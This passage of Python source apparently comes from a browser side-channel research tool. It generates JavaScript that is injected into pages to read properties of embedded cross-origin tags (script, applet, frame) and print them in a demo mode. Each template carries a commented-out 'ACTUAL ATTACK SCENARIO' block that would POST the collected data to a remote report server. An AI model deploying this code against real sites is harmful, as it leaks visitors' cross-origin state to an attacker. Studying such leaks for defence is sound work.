                    props.imageSrcset = convertToText(currentTag.imageSrcset);
                    props.imageSizes = convertToText(currentTag.imageSizes);
                    props.referrerPolicy = convertToText(currentTag.referrerPolicy);
                    props.crossOrigin = convertToText(currentTag.crossOrigin);
                    props.disabled = convertToText(currentTag.disabled);
                    props.rev = convertToText(currentTag.rev);
                    props.charset = convertToText(currentTag.charset);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "script":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.charset = convertToText(currentTag.charset);
                    props.type = convertToText(currentTag.type);
                    props.noModule = convertToText(currentTag.noModule);
                    props.async = convertToText(currentTag.async);
                    props.defer = convertToText(currentTag.defer);
                    props.crossOrigin = convertToText(currentTag.crossOrigin);
                    props.text = convertToText(currentTag.text);
                    props.integrity = convertToText(currentTag.integrity);
                    props.referrerPolicy = convertToText(currentTag.referrerPolicy);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "applet":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.object = convertToText(currentTag.object);
                    props.archive = convertToText(currentTag.archive);
                    props.codebase = convertToText(currentTag.codebase);
                    props.height = convertToText(currentTag.height);
                    props.width = convertToText(currentTag.width);
                    props.hspace = convertToText(currentTag.hspace);
                    props.vspace = convertToText(currentTag.vspace);
                    props.name = convertToText(currentTag.name);
                    props.alt = convertToText(currentTag.alt);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)
        elif tag == "frame":
            js = '''
                <script type="text/javascript">
                function convertToText(obj) {
                    if(typeof(obj) == undefined) return "undefined"
                    if(obj == null) return "null"
                    //create an array that will later be joined into a string.
                    var string = []
                    //is object
                    //    Both arrays and objects seem to return "object"
                    //    when typeof(obj) is applied to them. So instead
                    //    I am checking to see if they have the property
                    //    join, which normal objects don't have but
                    //    arrays do.
                    if (typeof(obj) == "object" && (obj.join == undefined)) {
                        string.push("{");
                        for (prop in obj) {
                            string.push(prop, ": ", convertToText(obj[prop]), ",");
                        };
                        string.push("}");

                    //is array
                    } else if (typeof(obj) == "object" && !(obj.join == undefined)) {
                        string.push("[")
                        for(prop in obj) {
                            string.push(convertToText(obj[prop]), ",");
                        }
                        string.push("]")

                    //is function
                    } else if (typeof(obj) == "function") {
                        string.push(obj.toString())

                    //all other values can be done with JSON.stringify
                    } else {
                        string.push(JSON.stringify(obj))
                    }

                    return string.join("")
                }
                var postObjectProperties = function(){
                    var props = { };
                    var currentTag = window.tag%s ;
                    props.frameborder = convertToText(currentTag.frameborder);
                    props.longdesc = convertToText(currentTag.longdesc);
                    props.marginheight = convertToText(currentTag.marginheight);
                    props.marginwidth = convertToText(currentTag.marginwidth);
                    props.name = convertToText(currentTag.name);
                    props.noresize = convertToText(currentTag.noresize);
                    props.scrolling = convertToText(currentTag.scrolling);

                    window.props%s = props;
                    var logMessage = {
                        "target_url": "%s", 
                        "tag": "%s",
                        "tag_uuid": "%s", 
                        "ks_lookup": JSON.stringify(%s),
                        "props": JSON.stringify(props),
                    }

                    // DEMO: Print the state on the console
                    PrintOPState(props, logMessage, logMessage.ks_lookup);

                    // ACTUAL ATTACK SCENARIO: Send collected results to a remote server
                    // request = $.ajax({
                    //     url: "%s",
                    //     contentType: "application/json; charset=utf-8",
                    //     type: "post",
                    //     data: JSON.stringify(logMessage),
                    //     dataType: 'text',
                    //     crossDomain: true,
                    // });

                    // // Callback handler that will be called on success
                    // request.done(function (response, textStatus, jqXHR){
                    //     console.log("message sent to log server");
                    //     console.log(response)
                    // });

                    // // Callback handler that will be called on failure
                    // request.fail(function (jqXHR, textStatus, errorThrown){
                    //     console.error("The following error occurred: "+ textStatus, errorThrown);
                    // });
                }
                setTimeout(function() {
                        postObjectProperties();
                    }, 7500);
                </script>
            '''%(tag_uuid, tag_uuid, inclusion_url, tag, tag_uuid, ks_lookup_string, report_uri)

        if tag == "frame":
            returnHTML = self._ef_apg._include_tag_in_head(html, js)
        else:
            returnHTML = self._ef_apg._include_tag_in_body(html, js)
        return returnHTML
